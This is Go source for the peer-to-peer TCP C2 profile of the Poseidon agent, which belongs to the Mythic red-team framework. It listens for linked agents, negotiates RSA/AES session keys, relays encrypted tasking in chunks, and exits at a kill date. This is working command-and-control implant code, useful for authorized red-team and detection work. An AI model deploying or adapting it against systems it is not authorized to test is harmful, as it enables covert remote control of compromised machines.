//go:build (linux || darwin) && tcp

package profiles

import (
	"crypto/rsa"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"

	"github.com/google/uuid"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// All variables must be a string so they can be set with ldflags
var tcp_initial_config string
var poseidonChunkSize = uint32(30000)

type TCPInitialConfig struct {
	Port                   uint
	Killdate               string
	EncryptedExchangeCheck bool
	AESPSK                 string
}

func (e *TCPInitialConfig) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["port"]; ok {
		e.Port = uint(v.(float64))
	}
	if v, ok := alias["killdate"]; ok {
		e.Killdate = v.(string)
	}
	if v, ok := alias["encrypted_exchange_check"]; ok {
		e.EncryptedExchangeCheck = v.(bool)
	}
	if v, ok := alias["AESPSK"]; ok {
		e.AESPSK = v.(string)
	}

	return nil
}

type C2PoseidonTCP struct {
	ExchangingKeys       bool
	Key                  string
	RsaPrivateKey        *rsa.PrivateKey
	Port                 string
	EgressTCPConnections map[string]net.Conn
	FinishedStaging      bool
	Killdate             time.Time
	egressLock           sync.RWMutex
	ShouldStop           bool
	stoppedChannel       chan bool
	PushChannel          chan structs.MythicMessage
	stopListeningChannel chan bool
	chunkSize            uint32
}

func (e C2PoseidonTCP) MarshalJSON() ([]byte, error) {
	alias := map[string]interface{}{
		"Key":           e.Key,
		"RsaPrivateKey": e.RsaPrivateKey,
		"Port":          e.Port,
		"Killdate":      e.Killdate,
	}
	return json.Marshal(alias)
}

func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(tcp_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial poseidon tcp config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := TCPInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial poseidon tcp config, exiting: %v\n", err))
		os.Exit(1)
	}
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := C2PoseidonTCP{
		Key:                  initialConfig.AESPSK,
		Port:                 fmt.Sprintf("%d", initialConfig.Port),
		ExchangingKeys:       initialConfig.EncryptedExchangeCheck,
		EgressTCPConnections: make(map[string]net.Conn),
		FinishedStaging:      false,
		Killdate:             killDateTime,
		ShouldStop:           false,
		stoppedChannel:       make(chan bool, 1),
		PushChannel:          make(chan structs.MythicMessage, 100),
		stopListeningChannel: make(chan bool, 1),
		chunkSize:            poseidonChunkSize,
	}
	// these two functions only need to happen once, not each time the profile is started
	go profile.CreateMessagesForEgressConnections()
	go profile.CheckForKillDate()
	RegisterAvailableC2Profile(&profile)
}
func (c *C2PoseidonTCP) CheckForKillDate() {
	for {
		time.Sleep(time.Duration(10) * time.Second)
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
	}
}
func (c *C2PoseidonTCP) Sleep() {

}
func (c *C2PoseidonTCP) Start() {
	// start listening
	var listen net.Listener
	var err error
	c.ShouldStop = false
	go func() {
		<-c.stopListeningChannel
		listen.Close()
		c.stoppedChannel <- true
	}()
	for {
		listen, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", c.Port))

		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to bind: %v\n", err))
			time.Sleep(1 * time.Second)
			continue
		}
		utils.PrintDebug(fmt.Sprintf("Listening on %s\n", c.Port))
		if c.ShouldStop {
			return
		}
		break
	}

	for {
		conn, err := listen.Accept()
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to accept connection: %v\n", err))
			return
		}
		go c.handleClientConnection(conn)
	}
}
func (c *C2PoseidonTCP) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	c.stopListeningChannel <- true
	utils.PrintDebug("issued stop to poseidon_tcp\n")
	<-c.stoppedChannel
	utils.PrintDebug("poseidon_tcp fully stopped\n")
}
func (c *C2PoseidonTCP) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2PoseidonTCP) IsRunning() bool {
	return !c.ShouldStop
}
func (c *C2PoseidonTCP) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.FinishedStaging = true
	c.ExchangingKeys = false
}
func (c *C2PoseidonTCP) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "Port":
		c.Port = value
		c.Stop()
		go c.Start()
	default:

	}
}
func (c *C2PoseidonTCP) GetPushChannel() chan structs.MythicMessage {
	if !c.ShouldStop {
		return c.PushChannel
	}
	return nil
}
func (c *C2PoseidonTCP) handleClientConnection(conn net.Conn) {
	// this is a new client connection to this listening server
	// first thing we want to do is save it off
	connectionUUID := uuid.New().String()
	c.EgressTCPConnections[connectionUUID] = conn
	go c.handleEgressConnectionIncomingMessage(conn)
	if c.FinishedStaging {
		utils.PrintDebug(fmt.Sprintf("FinishedStaging, Got a new connection, sending checkin\n"))
		go c.CheckIn()
	} else if c.ExchangingKeys {
		//fmt.Printf("ExchangingKeys, starting EKE\n")
		go c.NegotiateKey()
	} else {
		//fmt.Printf("Not finished staging, not exchanging keys, sending checkin\n")
		go c.CheckIn()
	}
}
func (c *C2PoseidonTCP) handleEgressConnectionIncomingMessage(conn net.Conn) {
	// These are normally formatted messages for our agent
	// in normal base64 format with our uuid, parse them as such
	var enc_raw []byte
	//fmt.Printf("handleEgressConnectionIncomingMessage started\n")
	for {
		readBuffer, err := c.ReadAndChunkData(conn)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("failed to read  tcp connection: %v\n", err))
			c.RemoveEgressTCPConnectionByConnection(conn)
			return
		}
		raw, err := base64.StdEncoding.DecodeString(string(readBuffer))
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to base64 decode data error: %v\n", err))
			continue
		}
		if len(raw) < 36 {
			utils.PrintDebug(fmt.Sprintf("length of message too short: %d\n", len(raw)))
			continue
		}
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw = c.decryptMessage(raw[36:])
			//log.Println(enc_raw)
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				utils.PrintDebug(fmt.Sprintf("decrypted message is 0, decryption failed\n"))
				continue
			}
		} else {
			enc_raw = raw[36:]
		}
		// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
		if c.FinishedStaging {
			taskResp := structs.MythicMessageResponse{}
			err = json.Unmarshal(enc_raw, &taskResp)
			if err != nil {
				fmt.Printf("Failed to unmarshal message into MythicResponse: %v\n", err)
			}
			utils.PrintDebug(fmt.Sprintf("Raw message from mythic: %s\n", string(enc_raw)))
			responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
		} else {
			if c.ExchangingKeys {
				// this will be our response to the initial staging message
				if c.FinishNegotiateKey(enc_raw) {
					c.CheckIn()
				} else {
					// we ran into some sort of issue during the staging process, so start it again
					c.NegotiateKey()
				}
			} else {
				// should be the result of c.Checkin()
				checkinResp := structs.CheckInMessageResponse{}
				err = json.Unmarshal(enc_raw, &checkinResp)
				if checkinResp.Status == "success" {
					SetMythicID(checkinResp.ID)
					c.FinishedStaging = true
				} else {
					//fmt.Printf("Failed to checkin, got a weird message: %s\n", string(enc_raw))
				}
			}
		}
	}
}

func (c *C2PoseidonTCP) ProfileName() string {
	return "tcp"
}
func (c *C2PoseidonTCP) IsP2P() bool {
	return true
}

// CheckIn - either a new agent or a new client connection, do the same for both
func (c *C2PoseidonTCP) CheckIn() structs.CheckInMessageResponse {
	checkin := CreateCheckinMessage()
	response := structs.CheckInMessageResponse{}
	raw, err := json.Marshal(checkin)
	if err != nil {
		fmt.Printf("Failed to marshal checkin message\n")
		response.Status = "error"
		return response
	}
	c.SendMessage(raw)
	response.Status = "success"
	return response
}

func (c *C2PoseidonTCP) FinishNegotiateKey(resp []byte) bool {
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err := json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
		return false
	}
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}
	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false
	return true
}

// NegotiateKey - EKE key negotiation
func (c *C2PoseidonTCP) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	c.SendMessage(raw)
	return true
}

func (c *C2PoseidonTCP) ChunkAndWriteData(conn net.Conn, data []byte) error {
	/*
		uint32 <-- total size of message (total chunks + current chunk + chunk data)
		uint32 <-- total chunks
		uint32 <-- current chunk
		byte[] <-- chunk of agent message
	*/
	totalChunks := (uint32(len(data)) / c.chunkSize) + 1
	utils.PrintDebug(fmt.Sprintf("Starting send with %d chunks\n", totalChunks))
	currentChunk := uint32(0)
	for currentChunk < totalChunks {
		var chunkData []byte
		if (currentChunk+1)*c.chunkSize >= uint32(len(data)) {
			chunkData = data[currentChunk*c.chunkSize:]
		} else {
			chunkData = data[currentChunk*c.chunkSize : (currentChunk+1)*c.chunkSize]
		}
		utils.PrintDebug(fmt.Sprintf("Sending chunk %d/%d\n", currentChunk+1, totalChunks))
		// first write the size of the chunk + size of total chunks + size of current chunk
		err := binary.Write(conn, binary.BigEndian, uint32(len(chunkData)+8))
		if err != nil {
			return err
		}
		err = binary.Write(conn, binary.BigEndian, totalChunks)
		if err != nil {
			return err
		}
		err = binary.Write(conn, binary.BigEndian, currentChunk)
		if err != nil {
			return err
		}
		totalWritten := 0
		for totalWritten < len(chunkData) {
			currentWrites, err := conn.Write(chunkData[totalWritten:])
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to send with error: %v\n", err))
				return err
			}
			totalWritten += currentWrites
			if currentWrites == 0 {
				return errors.New("failed to write to connection")
			}
		}
		utils.PrintDebug(fmt.Sprintf("sent %d bytes\n", uint32(len(chunkData)+8)))
		currentChunk += 1
	}
	return nil
}
func (c *C2PoseidonTCP) ReadAndChunkData(conn net.Conn) ([]byte, error) {
	var sizeBuffer uint32
	var totalChunks uint32
	var currentChunk uint32

	var totalBytes []byte
	for {
		err := binary.Read(conn, binary.BigEndian, &sizeBuffer)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("failed to read size from tcp connection: %v\n", err))
			return nil, err
		}
		if sizeBuffer == 0 {
			utils.PrintDebug(fmt.Sprintf("got 0 size from remote connection\n"))
			return nil, errors.New("got 0 size")
		}
		err = binary.Read(conn, binary.BigEndian, &totalChunks)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("failed to read total chunks from tcp connection: %v\n", err))
			return nil, err
		}
		err = binary.Read(conn, binary.BigEndian, &currentChunk)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("failed to read current chunk from tcp connection: %v\n", err))
			return nil, err
		}
		readBuffer := make([]byte, sizeBuffer-8)
		readSoFar, err := conn.Read(readBuffer)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("failed to read bytes from tcp connection: %v\n", err))
			return nil, err
		}
		totalRead := uint32(readSoFar)
		for totalRead < uint32(len(readBuffer)) {
			// we didn't read the full size of the message yet, read more
			nextBuffer := make([]byte, sizeBuffer-totalRead)
			readSoFar, err = conn.Read(nextBuffer)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("failed to read more bytes from tcp connection: %v\n", err))
				return nil, err
			}
			copy(readBuffer[totalRead:], nextBuffer)
			totalRead = totalRead + uint32(readSoFar)
		}
		// finished reading this chunk and all of its data
		totalBytes = append(totalBytes, readBuffer...)
		//copy(totalBytes[len(totalBytes):], readBuffer[:])
		utils.PrintDebug(fmt.Sprintf("Finished read for %d/%d chunks, for size %d\n", currentChunk+1, totalChunks, totalRead))
		if currentChunk+1 == totalChunks {
			utils.PrintDebug(fmt.Sprintf("Finished read for all chunks, for size %d\n", len(totalBytes)))
			return totalBytes, nil
		}
	}
}

// htmlPostData HTTP POST function
func (c *C2PoseidonTCP) SendMessage(sendData []byte) []byte {
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data")
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() == "" {
		//fmt.Printf("prepending payload uuid\n")
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	} else {
		//fmt.Printf("prepending %s\n", GetMythicID())
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	}
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	// Write the bytes out to the TCP connection, bytes.NewBuffer(sendData)
	// This needs to go out one of the EgressConnections, doesn't matter which
	for {
		// make a copy of the keys for the c.EgressTCPConnections to loop over
		// that way we can safely remove bad entries of the actual c.EgressTCPConnections in our loop without issue
		keys := make([]string, len(c.EgressTCPConnections))
		i := 0
		for k := range c.EgressTCPConnections {
			keys[i] = k
			i++
		}
		for _, connectionUUID := range keys {
			err := c.ChunkAndWriteData(c.EgressTCPConnections[connectionUUID], sendData)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to send with error: %v\n", err))
				// need to make sure we track that this egress connection is dead and should be removed
				c.RemoveEgressTCPConnection(connectionUUID)
				time.Sleep(200 * time.Millisecond)
				continue
			}
			return nil
		}
		// if we get here it means we have no more active egress connections, so we can't send it anywhere useful
		time.Sleep(200 * time.Millisecond)
	}
}

func (c *C2PoseidonTCP) CreateMessagesForEgressConnections() {
	// got a message that needs to go to one of the c.ExternalConnection
	for {
		msg := <-c.PushChannel
		raw, err := json.Marshal(msg)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
			continue
		}
		//fmt.Printf("Sending message outbound to websocket: %v\n", msg)
		c.SendMessage(raw)
	}
}
func (c *C2PoseidonTCP) RemoveEgressTCPConnection(connectionUUID string) bool {
	c.egressLock.Lock()
	defer c.egressLock.Unlock()
	utils.PrintDebug(fmt.Sprintf("removing egress connection: %s\n", connectionUUID))
	if conn, ok := c.EgressTCPConnections[connectionUUID]; ok {
		conn.Close()
		delete(c.EgressTCPConnections, connectionUUID)
		return true
	}
	return false
}
func (c *C2PoseidonTCP) RemoveEgressTCPConnectionByConnection(connection net.Conn) bool {
	c.egressLock.Lock()
	defer c.egressLock.Unlock()
	utils.PrintDebug(fmt.Sprintf("removing egress connection\n"))
	for connectionUUID, conn := range c.EgressTCPConnections {
		if connection.RemoteAddr().String() == conn.RemoteAddr().String() {
			// found the match, remove it and break
			conn.Close()
			delete(c.EgressTCPConnections, connectionUUID)
			//c.RemoveEgressTCPConnection(connectionUUID)
			return true
		}
	}
	return false
}
func (c *C2PoseidonTCP) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}
func (c *C2PoseidonTCP) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	//fmt.Printf("Decrypting with key: %s\n", hex.EncodeToString(key))
	//fmt.Printf("Decrypting message: %s\n", hex.EncodeToString(msg))
	return crypto.AesDecrypt(key, msg)
}
func (c *C2PoseidonTCP) SetSleepInterval(interval int) string {
	return fmt.Sprintf("Sleep interval not used for poseidon_tcp P2P Profile\n")
}
func (c *C2PoseidonTCP) SetSleepJitter(jitter int) string {
	return fmt.Sprintf("Sleep Jitter not used for poseidon_tcp P2P Profile\n")
}
func (c *C2PoseidonTCP) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	return 0
}
func (c *C2PoseidonTCP) GetSleepInterval() int {
	return 0
}
func (c *C2PoseidonTCP) GetSleepJitter() int {
	return 0
}
func (c *C2PoseidonTCP) GetKillDate() time.Time {
	return c.Killdate
}
